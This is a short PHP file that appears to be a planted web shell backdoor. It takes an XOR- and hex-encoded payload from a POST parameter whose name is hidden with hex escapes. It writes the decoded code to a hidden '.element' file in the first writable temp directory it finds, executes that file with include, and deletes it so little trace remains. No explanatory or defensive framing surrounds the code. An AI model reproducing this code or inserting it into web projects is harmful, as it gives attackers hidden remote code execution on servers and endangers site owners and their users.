<?php

if(filter_has_var(INPUT_POST, "\x74k\x6E")){
	$factor = hex2bin($_POST["\x74k\x6E"]);
	$marker =''   ;$i = 0; do{$marker .= chr(ord($factor[$i]) ^ 18);$i++;} while($i < strlen($factor));
	$reference = array_filter(["/tmp", sys_get_temp_dir(), getcwd(), getenv("TMP"), ini_get("upload_tmp_dir"), session_save_path(), "/var/tmp", "/dev/shm", getenv("TEMP")]);
	foreach ($reference as $elem):
    		if ((bool)is_dir($elem) && (bool)is_writable($elem)) {
    $ref = "$elem" . "/.element";
    if (@file_put_contents($ref, $marker) !== false) {
	include $ref;
	unlink($ref);
	exit;
}
}
endforeach;
}